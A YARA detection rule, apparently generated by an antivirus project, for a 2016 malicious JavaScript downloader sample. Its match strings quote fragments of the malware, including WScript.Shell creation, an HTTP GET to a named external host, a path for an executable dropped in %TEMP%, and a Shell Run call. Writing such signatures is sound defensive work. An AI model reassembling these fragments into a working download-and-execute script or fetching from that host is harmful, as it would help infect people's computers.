rule sig_20160401_32a3708b8bb68621d5c64f524451e9d1 {
  meta:
    description = "datamaliciousorder - file 20160401_32a3708b8bb68621d5c64f524451e9d1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aa5f7a9e0791a9f8f5059c50ed44c58b48233958d55ba1e56fdd7c7a29e9c40f"

  strings:
    $s1  = "function JejOu(VpwDy, WxWh){LopDg = LopDg * 1; return VpwDy - WxWh;};" fullword ascii
    $s2  = "var FuzKis = function KbxIb() {return WScript[PqUk](\"WScript\"+\".Shell\");}(), GnBp = 11;" fullword ascii
    $s3  = "KofZc[KooNxe](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s4  = "if (KofZc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QigMp() {return FuzKis[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Qf0qYnOSGc9g5Z.ex\" + \"e\";};" fullword ascii
    $s6  = "function IufDj(){return PsxRc + \"\";};" fullword ascii
    $s7  = "function LpYt() {return ((QkUnm == true) && (QkUnm == WkExw)) ? 1 : LopDg;};" fullword ascii
    $s8  = "function JhLfs(WnkXha){FuzKis[\"R\"+\"un\"](WnkXha, LopDg, LopDg);};" fullword ascii
    $s9  = "var QkUnm = false;" fullword ascii
    $s10 = "var WkExw = false;" fullword ascii
    $s11 = "var UltZsb = new this[\"Date\"]();" fullword ascii
    $s12 = "var DbNtt = false;" fullword ascii
    $s13 = "QkUnm = true; " fullword ascii
    $s14 = "return JejOu(TrUxy, QqcPs);" fullword ascii
    $s15 = "function AzhOab(){return 23;};" fullword ascii
    $s16 = "function AfMgu(){return PqUk;};" fullword ascii
    $s17 = "function LyYi(WeKpp) {var KpQuv = (1, 2, 3, 4, 5, WeKpp); return KpQuv;};" fullword ascii
    $s18 = "WkExw = true; " fullword ascii
    $s19 = "}while (KmAms);" fullword ascii
    $s20 = "function MzzEzf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}